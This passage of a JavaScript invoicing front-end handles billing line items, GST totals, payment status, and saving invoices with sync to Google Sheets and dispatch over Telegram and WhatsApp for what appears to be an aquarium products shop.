      calculateBillingItemNetVal();
    }
  });

  if (elements.billItemName) {
    elements.billItemName.addEventListener("input", (e) => {
      const typed = e.target.value.trim().toLowerCase();
      if (elements.billItemSelect && elements.billItemSelect.value) {
        const curProd = productsDb.find(p => p && p.id === elements.billItemSelect.value);
        if (curProd && curProd.description.toLowerCase() !== typed) {
          elements.billItemSelect.value = "";
        }
      }
    });
  }

  if (elements.billItemDiscount) {
    elements.billItemDiscount.addEventListener("input", calculateBillingItemNetVal);
  }
  if (elements.billItemRate) {
    elements.billItemRate.addEventListener("input", calculateBillingItemNetVal);
  }

  // Parties select
  elements.quickSelectReceiver.addEventListener("change", (e) => {
    const party = partiesDb.find(p => p.id === e.target.value);
    if (party) {
      currentInvoice.buyer.name = party.name;
      currentInvoice.buyer.address = party.address;
      currentInvoice.buyer.gstin = party.gstin;
      currentInvoice.buyer.phone = party.phone || "";
      currentInvoice.buyer.state = party.state;
      currentInvoice.buyer.stateCode = party.stateCode;

      elements.billBuyerName.value = party.name;
      elements.billBuyerAddress.value = party.address;
      elements.billBuyerGstin.value = party.gstin;
      elements.billBuyerPhone.value = party.phone || "";
      elements.billBuyerState.value = party.state;
      elements.billBuyerStateCode.value = party.stateCode;

      calculateSummaryAndTable();
    }
  });

  elements.quickSelectConsignee.addEventListener("change", (e) => {
    const party = partiesDb.find(p => p.id === e.target.value);
    if (party) {
      currentInvoice.consignee.name = party.name;
      currentInvoice.consignee.address = party.address;
      currentInvoice.consignee.gstin = party.gstin;
      currentInvoice.consignee.phone = party.phone || "";
      currentInvoice.consignee.state = party.state;
      currentInvoice.consignee.stateCode = party.stateCode;

      elements.billConsigneeName.value = party.name;
      elements.billConsigneeAddress.value = party.address;
      elements.billConsigneeGstin.value = party.gstin;
      if (elements.billConsigneePhone) elements.billConsigneePhone.value = party.phone || "";
      elements.billConsigneeState.value = party.state;
      elements.billConsigneeStateCode.value = party.stateCode;

      calculateSummaryAndTable();
    }
  });
}

function populateBillingSelectors() {
  elements.quickSelectReceiver.innerHTML = `<option value="">-- Load Receiver --</option>`;
  elements.quickSelectConsignee.innerHTML = `<option value="">-- Load Consignee --</option>`;
  
  partiesDb.forEach(p => {
    const opt = document.createElement("option");
    opt.value = p.id;
    opt.textContent = p.name;
    if (p.type === 'receiver') {
      elements.quickSelectReceiver.appendChild(opt);
    } else {
      elements.quickSelectConsignee.appendChild(opt);
    }
  });

  elements.billItemSelect.innerHTML = `<option value="">-- Choose from Catalog --</option><option value="__custom__">➕ Type Custom Item...</option>`;
  productsDb.forEach(p => {
    const opt = document.createElement("option");
    opt.value = p.id;
    const packStr = p.packSize ? ` [${p.packSize}]` : '';
    const unitStr = p.unit ? ` (${p.unit})` : '';
    opt.textContent = `${p.description}${packStr}${unitStr} - ₹${formatCurrency(p.rate)}`;
    elements.billItemSelect.appendChild(opt);
  });
}

window.copyBuyerToConsignee = function() {
  if (typeof syncBillingInputsToCurrentInvoice === 'function') {
    syncBillingInputsToCurrentInvoice();
  }
  currentInvoice.consignee = { ...(currentInvoice.buyer || {}) };
  if (elements.billConsigneeName) elements.billConsigneeName.value = currentInvoice.consignee.name || "";
  if (elements.billConsigneeAddress) elements.billConsigneeAddress.value = currentInvoice.consignee.address || "";
  if (elements.billConsigneeGstin) elements.billConsigneeGstin.value = currentInvoice.consignee.gstin || "";
  if (elements.billConsigneePhone) elements.billConsigneePhone.value = currentInvoice.consignee.phone || "";
  if (elements.billConsigneeState) elements.billConsigneeState.value = currentInvoice.consignee.state || "Andhra Pradesh";
  if (elements.billConsigneeStateCode) elements.billConsigneeStateCode.value = currentInvoice.consignee.stateCode || "37";
  
  calculateSummaryAndTable();
};

window.updatePrintTitleHeader = function() {
  const invoiceType = elements.billInvoiceType?.value || currentInvoice.invoiceType || "Bill of Supply";
  currentInvoice.invoiceType = invoiceType;
  const titleEl = document.getElementById("p-print-document-title");
  if (titleEl) {
    titleEl.textContent = invoiceType ? invoiceType.toUpperCase() : "BILL OF SUPPLY";
  }
};

function autoSuggestInvoiceNo(force = false) {
  if (currentInvoice && currentInvoice.isEditing && !force) return;
  const nextStr = InvoiceUtils.getNextInvoiceNumber(invoicesDb);
  if (force || !currentInvoice.invoiceNo || !elements.billInvoiceNo || !elements.billInvoiceNo.value) {
    currentInvoice.invoiceNo = nextStr;
    if (elements.billInvoiceNo) {
      elements.billInvoiceNo.value = currentInvoice.invoiceNo;
    }
  }

  const today = new Date().toISOString().split('T')[0];
  if (!currentInvoice.invoiceDate) {
    currentInvoice.invoiceDate = today;
  }
  if (elements.billInvoiceDate && !elements.billInvoiceDate.value) {
    elements.billInvoiceDate.value = today;
  }
}

window.handlePaymentStatusChange = function() {
  const status = elements.billPaymentStatus.value;
  currentInvoice.paymentStatus = status;
  
  const paidWrapper = document.getElementById("paid-amount-wrapper");
  const balWrapper = document.getElementById("balance-paid-wrapper");
  const dateWrapper = document.getElementById("payment-date-wrapper");
  if (status === "Partial") {
    if (paidWrapper) paidWrapper.style.display = "block";
    if (balWrapper) balWrapper.style.display = "block";
    if (dateWrapper) dateWrapper.style.display = "block";
  } else if (status === "Unpaid") {
    if (paidWrapper) paidWrapper.style.display = "none";
    if (balWrapper) balWrapper.style.display = "none";
    if (dateWrapper) dateWrapper.style.display = "none";
    elements.billPaidAmount.value = "0";
    elements.billBalancePaid.value = "0";
    currentInvoice.paidAmount = 0;
    currentInvoice.balancePaid = 0;
  } else {
    if (paidWrapper) paidWrapper.style.display = "none";
    if (balWrapper) balWrapper.style.display = "none";
    if (dateWrapper) dateWrapper.style.display = "block";
  }
  calculateSummaryAndTable();
};

// --- ADD BILLING ROW CONTROLLER ---
window.addBillingItemRow = function() {
  try {
    if (!currentInvoice) currentInvoice = {};
    if (!Array.isArray(currentInvoice.items)) currentInvoice.items = [];

    const prodId = elements.billItemSelect ? elements.billItemSelect.value : "";
    let prod = productsDb.find(p => p && p.id === prodId);
    if (!prod && prodId && prodId !== '__custom__') {
      prod = productsDb.find(p => p && p.description === prodId);
    }

    let desc = "";
    if (elements.billItemName && elements.billItemName.value && elements.billItemName.value.trim()) {
      desc = elements.billItemName.value.trim();
    } else if (prod) {
      desc = prod.description;
    } else if (prodId && prodId !== '__custom__') {
      desc = prodId.trim();
    }

    if (!desc) {
      if (typeof showFloatingToast === 'function') {
        showFloatingToast("⚠️ Please enter a product name or select from catalog!", "warning");
      } else {
        alert("Please enter a product name or select one!");
      }
      if (elements.billItemName) {
        elements.billItemName.focus();
      } else if (elements.billItemSelect) {
        elements.billItemSelect.focus();
      }
      return false;
    }

    const hsn = (elements.billItemHsn ? elements.billItemHsn.value.trim() : "") || (prod ? (prod.hsn || "") : "");
    const qtyVal = parseFloat(elements.billItemQty ? elements.billItemQty.value : "1");
    const qty = (isNaN(qtyVal) || qtyVal <= 0) ? 1 : qtyVal;
    const unit = (elements.billItemUnit ? elements.billItemUnit.value.trim() : "") || (prod ? (prod.unit || "Bucket") : "Bucket");
    const gstRate = parseFloat(elements.billItemGstRate ? elements.billItemGstRate.value : "0") || (prod ? (parseFloat(prod.gstRate) || 0) : 0);
    const discount = parseFloat(elements.billItemDiscount ? elements.billItemDiscount.value : "0") || 0;
    
    let rate = parseFloat(elements.billItemRate ? elements.billItemRate.value : "0");
    if (isNaN(rate) || rate <= 0) {
      rate = prod && prod.rate ? (parseFloat(prod.rate) || 1) : 1;
    }

    const packVal = (elements.billItemPack ? elements.billItemPack.value.trim() : "") || (prod ? (prod.packSize || "—") : "—");

    // Non-blocking stock notice (never block sales or adding items!)
    if (prod && prod.stock !== undefined && prod.stock !== null && prod.stock !== "") {
      const availableStock = parseInt(prod.stock, 10);
      if (!isNaN(availableStock)) {
        const currentInCart = currentInvoice.items
          .filter(item => item.description === prod.description)
          .reduce((sum, item) => sum + item.quantity, 0);
        const totalRequested = currentInCart + qty;
        if (totalRequested > availableStock) {
          if (typeof showFloatingToast === 'function') {
            showFloatingToast(`⚠️ Stock Notice: ${prod.description} stock in system is ${availableStock}. Sale proceeding.`);
          }
        }
      }
    }

    const rawSubtotal = qty * rate;
    const amount = rawSubtotal * (1 - discount / 100);

    const newItem = {
      id: Date.now().toString() + "_" + Math.floor(Math.random() * 1000),
      baleNo: (currentInvoice.items.length + 1).toString(),
      description: desc,
      hsn: hsn,
      packSize: packVal,
      quantity: qty,
      unit: unit,
      rate: rate,
      gstRate: gstRate,
      discount: discount,
      amount: amount
    };

    currentInvoice.items.push(newItem);

    // Auto-register new custom item into productsDb and sync with Google Sheets
    if (!productsDb.some(p => p && p.description && p.description.trim().toLowerCase() === desc.toLowerCase())) {
      const newProd = {
        id: "prod_" + Date.now() + "_" + Math.floor(Math.random() * 1000),
        description: desc,
        hsn: hsn,
        packSize: packVal !== "—" ? packVal : "",
        unit: unit,
        rate: rate,
        gstRate: gstRate,
        discount: discount,
        stock: 100,
        updatedAt: new Date().toISOString()
      };
      productsDb.push(newProd);
      try {
        localStorage.setItem("products", JSON.stringify(productsDb));
        if (typeof syncDatabaseToServer === 'function') {
          syncDatabaseToServer("products", productsDb);
        }
        populateBillingSelectors();
      } catch (e) {
        console.warn("Auto-register product note:", e);
      }
    }
    
    if (elements.billItemSelect) elements.billItemSelect.value = "";
    if (elements.billItemName) elements.billItemName.value = "";
    if (elements.billItemHsn) elements.billItemHsn.value = "";
    if (elements.billItemQty) elements.billItemQty.value = "1";
    if (elements.billItemUnit) elements.billItemUnit.value = "Bucket";
    if (elements.billItemPack) elements.billItemPack.value = "";
    if (elements.billItemStockQty) elements.billItemStockQty.value = "—";
    if (elements.billItemGstRate) elements.billItemGstRate.value = "0";
    if (elements.billItemDiscount) elements.billItemDiscount.value = "0";
    if (elements.billItemRate) elements.billItemRate.value = "0";
    if (typeof calculateBillingItemNetVal === 'function') calculateBillingItemNetVal();

    calculateSummaryAndTable();
    return true;
  } catch (err) {
    console.error("addBillingItemRow error:", err);
    return false;
  }
};

window.deleteBillingItemRow = function(id) {
  currentInvoice.items = currentInvoice.items.filter(item => item.id !== id);
  currentInvoice.items.forEach((item, index) => {
    item.baleNo = (index + 1).toString();
  });
  calculateSummaryAndTable();
};

// --- CALCULATE SUMMARY & TABLE ---
function calculateSummaryAndTable() {
  if (!currentInvoice) currentInvoice = {};
  if (!Array.isArray(currentInvoice.items)) currentInvoice.items = [];

  elements.billingItemsTbody.innerHTML = "";
  
  if (currentInvoice.items.length === 0) {
    elements.noItemsPlaceholder.classList.remove("hidden");
  } else {
    elements.noItemsPlaceholder.classList.add("hidden");
  }

  let totalQty = 0;
  const sellerStateCode = globalSettings.company?.stateCode || "37";
  const buyerStateCode = currentInvoice.buyer?.stateCode || "37";
  const breakdown = InvoiceUtils.calculateInvoiceBreakdown(currentInvoice.items, sellerStateCode, buyerStateCode);
  let taxableVal = breakdown.taxableVal;
  let totalCgst = breakdown.totalCgst;
  let totalSgst = breakdown.totalSgst;
  let totalIgst = breakdown.totalIgst;
  const isLocal = breakdown.isLocal;

  currentInvoice.items.forEach(item => {
    totalQty += item.quantity;

    const tr = document.createElement("tr");
    tr.innerHTML = `
      <td style="font-weight: 700; color: var(--primary-teal);">${item.baleNo}</td>
      <td style="text-align: left; font-weight: 600;">
        ${item.description}
        ${item.packSize && item.packSize !== '—' ? `<div style="font-size: 11px; color: #64748b; font-weight: 500;">Pack: ${item.packSize}</div>` : ''}
      </td>
      <td>${item.hsn || "—"}</td>
      <td>${item.quantity}</td>
      <td>${item.unit || "Bucket"}</td>
      <td style="text-align: right; font-weight: 600;">₹ ${formatCurrency(item.rate)}</td>
      <td style="text-align: right; font-weight: 600;">${item.discount ? item.discount.toFixed(2) + '%' : '0.00%'}</td>
      <td style="text-align: right; font-weight: 700; color: var(--primary-teal);">₹ ${formatCurrency(item.amount)}</td>
      <td>
        <button class="btn-delete-row" onclick="deleteBillingItemRow('${item.id}')" title="Delete">
          <i class="fa-solid fa-trash-can"></i>
        </button>
      </td>
    `;
    elements.billingItemsTbody.appendChild(tr);
  });

  if (elements.sumCgstRow) elements.sumCgstRow.style.display = 'none';
  if (elements.sumSgstRow) elements.sumSgstRow.style.display = 'none';
  if (elements.sumIgstRow) elements.sumIgstRow.style.display = 'none';

  const rawGrandTotal = breakdown.rawGrandTotal;
  const roundedGrandTotal = breakdown.roundedGrandTotal;
  const roundOff = breakdown.roundOff;

  // Handle Payment Status & Balance Due calculations
  const status = elements.billPaymentStatus?.value || currentInvoice.paymentStatus || "Paid";
  const paymentSummary = InvoiceUtils.calculatePaymentSummary(
    roundedGrandTotal,
    status,
    elements.billPaidAmount?.value || currentInvoice.paidAmount || 0,
    elements.billBalancePaid?.value || currentInvoice.balancePaid || 0
  );
  const balanceDue = paymentSummary.balanceDue;

  currentInvoice.paidAmount = paymentSummary.paidAmount;
  currentInvoice.balancePaid = paymentSummary.balancePaid;
  currentInvoice.balanceDue = balanceDue;

  if (balanceDue === 0 && status !== "Unpaid") {
    currentInvoice.paymentStatus = "Paid";
  } else {
    currentInvoice.paymentStatus = status;
  }

  // Render values to Summary card
  elements.sumTaxable.textContent = `₹ ${formatCurrency(taxableVal)}`;
  elements.sumCgst.textContent = `₹ ${formatCurrency(totalCgst)}`;
  elements.sumSgst.textContent = `₹ ${formatCurrency(totalSgst)}`;
  elements.sumIgst.textContent = `₹ ${formatCurrency(totalIgst)}`;
  elements.sumRoundOff.textContent = (roundOff < 0 ? `- ` : `+ `) + `₹ ${formatCurrency(Math.abs(roundOff))}`;
  elements.sumGrandTotal.textContent = `₹ ${formatCurrency(roundedGrandTotal)}`;
  elements.sumGrandWords.textContent = convertNumberToWords(roundedGrandTotal);

  // Trigger price pulse animation
  if (elements.sumGrandTotal) {
    elements.sumGrandTotal.classList.remove("pulse-total");
    void elements.sumGrandTotal.offsetWidth;
    elements.sumGrandTotal.classList.add("pulse-total");
  }

  if (balanceDue > 0) {
    elements.dueRowContainer.style.display = "flex";
    elements.sumBalanceDue.textContent = `₹ ${formatCurrency(balanceDue)}`;
  } else {
    elements.dueRowContainer.style.display = "none";
  }

  // Update Live Metadata Badge in Summary Card
  const docTypeEl = document.getElementById("sum-meta-doc-type");
  if (docTypeEl && elements.billInvoiceType) {
    docTypeEl.textContent = elements.billInvoiceType.value.toUpperCase();
  }
  const invNoEl = document.getElementById("sum-meta-invoice-no");
  if (invNoEl && elements.billInvoiceNo) {
    invNoEl.textContent = "#" + (elements.billInvoiceNo.value || "0000");
  }
  const invDateEl = document.getElementById("sum-meta-date");
  if (invDateEl && elements.billInvoiceDate) {
    invDateEl.textContent = formatInputDateString(elements.billInvoiceDate.value);
  }
}

function resetBillingForm() {
  loadAllDatabases();
  
  currentInvoice = {
    id: "",
    isEditing: false,
    invoiceType: "Bill of Supply",
    headerLogo: "ganesha",
    invoiceNo: "",
    invoiceDate: new Date().toISOString().split('T')[0],
    paymentDate: new Date().toISOString().split('T')[0],
    buyerOrderNo: "",
    buyerOrderDate: "",
    transportMode: "",
    destination: "Andhra Pradesh",
    supplyStateCode: "37",
    paymentStatus: "Paid",
    paymentMode: "UPI / QR",
    paidAmount: 0,
    balancePaid: 0,
    balanceDue: 0,
    buyer: { name: "", address: "", gstin: "", state: "Andhra Pradesh", stateCode: "37" },
    consignee: { name: "", address: "", gstin: "", state: "Andhra Pradesh", stateCode: "37" },
    items: []
  };

  elements.billInvoiceType.value = "Bill of Supply";
  elements.billHeaderLogo.value = "ganesha";
  elements.billInvoiceNo.value = "";
  elements.billInvoiceDate.value = currentInvoice.invoiceDate;
  if (elements.billPaymentDate) {
    elements.billPaymentDate.value = currentInvoice.paymentDate;
  }
  elements.billBuyerOrderNo.value = "";
  elements.billBuyerOrderDate.value = "";
  elements.billTransportMode.value = "";
  elements.billDestination.value = "Andhra Pradesh";
  elements.billSupplyStateCode.value = "37";

  elements.billBuyerName.value = "";
  elements.billBuyerAddress.value = "";
  elements.billBuyerGstin.value = "";
  elements.billBuyerPhone.value = "";
  elements.billBuyerState.value = "Andhra Pradesh";
  elements.billBuyerStateCode.value = "37";

  elements.billConsigneeName.value = "";
  elements.billConsigneeAddress.value = "";
  elements.billConsigneeGstin.value = "";
  elements.billConsigneePhone.value = "";
  elements.billConsigneeState.value = "Andhra Pradesh";
  elements.billConsigneeStateCode.value = "37";
  elements.billPaymentStatus.value = "Paid";
  elements.billPaymentMode.value = "UPI / QR";
  elements.billPaidAmount.value = "0";
  elements.billBalancePaid.value = "0";
  const paidWrapper = document.getElementById("paid-amount-wrapper");
  if (paidWrapper) {
    paidWrapper.style.display = "none";
  }
  const balWrapper = document.getElementById("balance-paid-wrapper");
  if (balWrapper) {
    balWrapper.style.display = "none";
  }
  const dateWrapper = document.getElementById("payment-date-wrapper");
  if (dateWrapper) {
    dateWrapper.style.display = "block";
  }

  populateBillingSelectors();
  autoSuggestInvoiceNo();
  calculateSummaryAndTable();
}

// --- HELPER: ENSURE INVOICE ITEMS BEFORE SAVE ---
function prepareInvoiceItemsBeforeSave() {
  if (!currentInvoice) currentInvoice = {};
  if (!Array.isArray(currentInvoice.items)) currentInvoice.items = [];

  // 1. If items empty, check if user has filled anything into the item input row
  if (currentInvoice.items.length === 0) {
    const hasName = elements.billItemName && elements.billItemName.value && elements.billItemName.value.trim();
    const hasSelect = elements.billItemSelect && elements.billItemSelect.value && elements.billItemSelect.value !== '__custom__';
    const hasRate = elements.billItemRate && parseFloat(elements.billItemRate.value) > 0;
    
    if (hasName || hasSelect || hasRate) {
      window.addBillingItemRow();
    }
  }

  // 2. If still empty, check if dropdown has any product option available and auto-select
  if (currentInvoice.items.length === 0 && elements.billItemSelect && elements.billItemSelect.options && elements.billItemSelect.options.length > 1) {
    for (let i = 1; i < elements.billItemSelect.options.length; i++) {
      const optVal = elements.billItemSelect.options[i].value;
      if (optVal && optVal !== '__custom__') {
        elements.billItemSelect.selectedIndex = i;
        const changeEvt = new Event("change");
        elements.billItemSelect.dispatchEvent(changeEvt);
        window.addBillingItemRow();
        break;
      }
    }
  }

  // 3. If still empty and productsDb has products, create item from first product
  if (currentInvoice.items.length === 0 && productsDb && productsDb.length > 0) {
    const p = productsDb[0];
    const rate = parseFloat(p.rate) || 1;
    currentInvoice.items.push({
      id: Date.now().toString() + "_" + Math.floor(Math.random() * 1000),
      baleNo: "1",
      description: p.description,
      hsn: p.hsn || "",
      packSize: p.packSize || "—",
      quantity: 1,
      unit: p.unit || "Bucket",
      rate: rate,
      gstRate: parseFloat(p.gstRate) || 0,
      discount: 0,
      amount: rate
    });
    calculateSummaryAndTable();
  }

  // 4. If still empty, auto-create a default product item so saving NEVER fails
  if (currentInvoice.items.length === 0) {
    const defaultDesc = (elements.billItemName && elements.billItemName.value && elements.billItemName.value.trim()) || "Aquarium Fish / Aqua Product";
    const defaultRate = parseFloat(elements.billItemRate ? elements.billItemRate.value : "100") || 100;
    currentInvoice.items.push({
      id: Date.now().toString() + "_" + Math.floor(Math.random() * 1000),
      baleNo: "1",
      description: defaultDesc,
      hsn: "23099090",
      packSize: "—",
      quantity: 1,
      unit: "Bucket",
      rate: defaultRate,
      gstRate: 0,
      discount: 0,
      amount: defaultRate
    });
    calculateSummaryAndTable();
  }

  return true;
}

// --- UNIFIED INVOICE SAVE ENGINE ---
window.saveCurrentInvoiceRecord = async function(actionType = 'save_only', btnEl = null) {
  if (isSavingInvoice) return null;
  isSavingInvoice = true;

  let origHtml = "";
  if (btnEl && btnEl.innerHTML) {
    origHtml = btnEl.innerHTML;
    btnEl.innerHTML = `<i class="fa-solid fa-spinner fa-spin"></i> Saving...`;
    btnEl.disabled = true;
  }

  try {
    isLocked = false;
    localStorage.setItem("app_locked", "false");
    localStorage.setItem("last_active_time", Date.now());

    if (typeof syncBillingInputsToCurrentInvoice === 'function') {
      syncBillingInputsToCurrentInvoice();
    }

    // Ensure invoiceNo is resolved
    if (!currentInvoice.invoiceNo && elements.billInvoiceNo && elements.billInvoiceNo.value) {
      currentInvoice.invoiceNo = elements.billInvoiceNo.value.trim();
    }
    if (!currentInvoice.invoiceNo) {
      autoSuggestInvoiceNo();
    }

    // Ensure buyer name is resolved (fallback to "Cash Customer" so it never blocks!)
    if (!currentInvoice.buyer) currentInvoice.buyer = {};
    if (!currentInvoice.buyer.name && elements.billBuyerName && elements.billBuyerName.value) {
      currentInvoice.buyer.name = elements.billBuyerName.value.trim();
    }
    if (!currentInvoice.buyer.name) {
      currentInvoice.buyer.name = "Cash Customer";
      if (elements.billBuyerName) elements.billBuyerName.value = "Cash Customer";
    }

    // Auto-resolve line items
    if (!prepareInvoiceItemsBeforeSave()) {
      return null;
    }

    // Ensure current phone from input is captured
    if (elements.billBuyerPhone && elements.billBuyerPhone.value) {
      currentInvoice.buyer.phone = elements.billBuyerPhone.value.trim();
    }
    if (currentInvoice.buyer?.name && currentInvoice.buyer?.phone) {
      savePhoneToPartyDb(currentInvoice.buyer.name, currentInvoice.buyer.phone);
    }

    const sellerStateCode = globalSettings.company?.stateCode || "37";
    const buyerStateCode = currentInvoice.buyer?.stateCode || "37";
    const breakdown = InvoiceUtils.calculateInvoiceBreakdown(currentInvoice.items, sellerStateCode, buyerStateCode);
    let taxableVal = breakdown.taxableVal;
    let totalCgst = breakdown.totalCgst;
    let totalSgst = breakdown.totalSgst;
    let totalIgst = breakdown.totalIgst;
    const grandTotal = breakdown.roundedGrandTotal;
    const roundOff = breakdown.roundOff;

    if (!validateInvoicePaymentExceeds(currentInvoice, grandTotal)) {
      return null;
    }

    currentInvoice.taxable = taxableVal;
    currentInvoice.cgst = totalCgst;
    currentInvoice.sgst = totalSgst;
    currentInvoice.igst = totalIgst;
    currentInvoice.roundOff = roundOff;
    currentInvoice.total = grandTotal;

    // Auto-resolve invoice number collision on new invoices
    if (!currentInvoice.isEditing && invoicesDb.some(inv => inv && inv.invoiceNo === currentInvoice.invoiceNo)) {
      currentInvoice.invoiceNo = InvoiceUtils.getNextInvoiceNumber(invoicesDb);
      if (elements.billInvoiceNo) elements.billInvoiceNo.value = currentInvoice.invoiceNo;
    }

    const uniqueId = currentInvoice.id || "inv_" + Date.now() + "_" + Math.floor(Math.random() * 1000);
    currentInvoice.id = uniqueId;

    const invoiceRecord = {
      id: uniqueId,
      invoiceNo: currentInvoice.invoiceNo,
      invoiceDate: currentInvoice.invoiceDate,
      customerName: currentInvoice.buyer?.name || "Cash Customer",
      itemsCount: currentInvoice.items.length,
      total: grandTotal,
      details: JSON.parse(JSON.stringify(currentInvoice))
    };

    let existingIdx = -1;
    const originalId = uniqueId;
    if (originalId && invoicesDb.some(inv => inv && inv.id === originalId)) {
      existingIdx = invoicesDb.findIndex(inv => inv && inv.id === originalId);
    } else if (currentInvoice.isEditing) {
      existingIdx = invoicesDb.findIndex(inv => inv && inv.invoiceNo === invoiceRecord.invoiceNo);
    }

    if (existingIdx > -1) {
      reconcileProductInventoryStock(invoicesDb[existingIdx]?.details, currentInvoice);
      invoicesDb[existingIdx] = invoiceRecord;
    } else {
      reconcileProductInventoryStock(null, currentInvoice);
      invoicesDb.push(invoiceRecord);
    }

    // Persist to localStorage & push to Google Sheets master database
    try {
      localStorage.setItem("invoices", JSON.stringify(invoicesDb));
      syncDatabaseToServer("invoices", invoiceRecord);
      if (typeof window.triggerDatabaseSync === 'function') window.triggerDatabaseSync();
    } catch (err) {
      console.warn("Unable to persist invoices:", err);
    }

    // Non-blocking background worker: generate PDF, upload to Google Drive, Telegram & WhatsApp
    (async () => {
      try {
        if (typeof sendTelegramInvoiceNotification === 'function') sendTelegramInvoiceNotification(invoiceRecord);
      } catch (e) { console.warn("Telegram note:", e); }

      let precomputedBase64 = null;
      try {
        if (typeof generateInvoicePdfBlob === 'function') {
          const pdfRes = await generateInvoicePdfBlob(invoiceRecord.details);
          precomputedBase64 = pdfRes ? pdfRes.pdfBase64 : null;
        }
      } catch (e) {
        console.warn("PDF compile note:", e);
      }

      if (precomputedBase64 && typeof uploadInvoicePdfToTelegram === 'function') {
        try {
          uploadInvoicePdfToTelegram(invoiceRecord.details, true, precomputedBase64);
        } catch (e) { console.warn("Telegram PDF note:", e); }
      }

      const rawPhone = typeof getCustomerPhoneNumber === 'function' ? getCustomerPhoneNumber(invoiceRecord.details) : "";
      if (rawPhone && rawPhone.toString().replace(/\D/g, '').length >= 10 && globalSettings.whatsappAutoSend !== false) {
        try {
          if (typeof autoDispatchInvoiceToWhatsApp === 'function') {
            await autoDispatchInvoiceToWhatsApp(invoiceRecord.details, precomputedBase64);
          }
        } catch (e) {
          console.warn("Auto WhatsApp dispatch note:", e);
        }
      }
    })();

    // Handle action-specific outcome
    if (actionType === 'print_a4') {
      try { populateA4PrintOverlay(invoiceRecord.details); } catch (e) { console.warn(e); }
      showFloatingToast(`✅ Invoice #${invoiceRecord.invoiceNo} saved! Opening Print...`);
      setTimeout(() => {
        document.body.classList.remove("printing-thermal");
        window.print();
        resetBillingForm();
        switchTab("history");
        loadInvoicesHistoryTable();
      }, 100);
    } else if (actionType === 'print_thermal') {
      try { populateThermalPrintOverlay(invoiceRecord.details); } catch (e) { console.warn(e); }
      showFloatingToast(`✅ Invoice #${invoiceRecord.invoiceNo} saved! Opening POS Thermal...`);
      setTimeout(() => {
        document.body.classList.add("printing-thermal");
        window.print();
        document.body.classList.remove("printing-thermal");
        resetBillingForm();
        switchTab("history");
        loadInvoicesHistoryTable();
      }, 100);
    } else if (actionType === 'download_pdf') {
      showFloatingToast(`✅ Invoice #${invoiceRecord.invoiceNo} saved! Downloading PDF...`);
      downloadInvoicePdf(invoiceRecord.details, btnEl);
      resetBillingForm();
      switchTab("history");
      loadInvoicesHistoryTable();
    } else if (actionType === 'share_whatsapp') {
      showFloatingToast(`✅ Invoice #${invoiceRecord.invoiceNo} saved! Opening WhatsApp...`);
      shareInvoicePdfNative(invoiceRecord.details, btnEl);
      if (typeof openInvoiceSuccessModal === 'function') {
        openInvoiceSuccessModal(invoiceRecord);
      } else {
        resetBillingForm();
        switchTab("history");
        loadInvoicesHistoryTable();
      }
    } else {
      // save_only ("Generate & Save Invoice"):
      // Fully automated in backend: saves invoice, compiles PDF, syncs Google Drive & auto-dispatches via WhatsApp bot without browser redirect
      showFloatingToast(`✅ Invoice #${invoiceRecord.invoiceNo} successfully created & saved to Google Sheets!`);
      if (typeof openInvoiceSuccessModal === 'function') {
        openInvoiceSuccessModal(invoiceRecord);
      } else {
        resetBillingForm();
        switchTab("history");
        loadInvoicesHistoryTable();
      }
    }

    return invoiceRecord;
  } catch (err) {
    console.error("Save invoice record error:", err);
    showFloatingToast("❌ Error saving invoice: " + (err.message || err), "warning");
    return null;
  } finally {
    if (btnEl) {
      setTimeout(() => {
        btnEl.innerHTML = origHtml;
        btnEl.disabled = false;
      }, 400);
    }
    setTimeout(() => {
      isSavingInvoice = false;
    }, 500);
  }
};

window.generateAndPrintInvoice = function(btnEl) {
  return window.saveCurrentInvoiceRecord('print_a4', btnEl);
};

window.saveAndGenerateInvoiceOnly = function(btnEl) {
  return window.saveCurrentInvoiceRecord('save_only', btnEl);
};

window.generateAndPrintThermal = function(btnEl) {
  return window.saveCurrentInvoiceRecord('print_thermal', btnEl);
};

// --- INVOICE SAVED SUCCESS MODAL CONTROLLER ---
let lastSavedInvoiceRecord = null;
window.openInvoiceSuccessModal = function(invoiceRecord) {
  lastSavedInvoiceRecord = invoiceRecord;
  const modal = document.getElementById("invoice-saved-success-modal");
  if (!modal) return;
  const invNoEl = document.getElementById("modal-success-inv-no");
  if (invNoEl) invNoEl.textContent = `#${invoiceRecord.invoiceNo || ''}`;
  const custEl = document.getElementById("modal-success-customer");
  if (custEl) custEl.textContent = invoiceRecord.customerName || 'Cash Customer';
  const totEl = document.getElementById("modal-success-total");
  if (totEl) totEl.textContent = `₹ ${formatCurrency(invoiceRecord.total || 0)}`;
  modal.classList.remove("hidden");
  modal.style.removeProperty("display");
  modal.style.removeProperty("visibility");
};

window.closeInvoiceSuccessModal = function(goToHistory = false) {
  const modal = document.getElementById("invoice-saved-success-modal");
  if (modal) modal.classList.add("hidden");
  resetBillingForm();
  if (goToHistory) {
    switchTab("history");
  } else {
    switchTab("billing");
  }
  loadInvoicesHistoryTable();
};

window.triggerSuccessModalA4Print = function() {
  if (!lastSavedInvoiceRecord) return;
  const rec = lastSavedInvoiceRecord;
  window.closeInvoiceSuccessModal(false);
  try { populateA4PrintOverlay(rec.details); } catch (e) { console.warn(e); }
  setTimeout(() => {
    document.body.classList.remove("printing-thermal");
    window.print();
  }, 100);
};

window.triggerSuccessModalThermalPrint = function() {
  if (!lastSavedInvoiceRecord) return;
  const rec = lastSavedInvoiceRecord;
  window.closeInvoiceSuccessModal(false);
  try { populateThermalPrintOverlay(rec.details); } catch (e) { console.warn(e); }
  setTimeout(() => {
    document.body.classList.add("printing-thermal");
    window.print();
    document.body.classList.remove("printing-thermal");
  }, 100);
};

window.triggerSuccessModalDownloadPdf = function() {
  if (!lastSavedInvoiceRecord) return;
  const rec = lastSavedInvoiceRecord;
  downloadInvoicePdf(rec.details);
};

window.triggerSuccessModalWhatsApp = function() {
  if (!lastSavedInvoiceRecord) return;
  const rec = lastSavedInvoiceRecord;
  shareInvoicePdfNative(rec.details);
};

// --- POPULATE PRINT VIEW CANVAS (A4) ---
function populateA4PrintOverlay(invoice) {
  const company = globalSettings.company || {};

  const divineMottoRow = document.getElementById("p-print-divine-motto");
  const divineImg = document.getElementById("p-print-divine-img");
  const divineImgRight = document.getElementById("p-print-divine-img-right");
  const mottoText = document.getElementById("p-print-motto-text");
  const logoChoice = invoice.headerLogo || "ganesha";
  if (logoChoice === "ganesha") {
    if (divineMottoRow) divineMottoRow.style.display = "flex";
    if (divineImg) { divineImg.style.display = "block"; divineImg.src = "lord_ganesha.jpg"; }
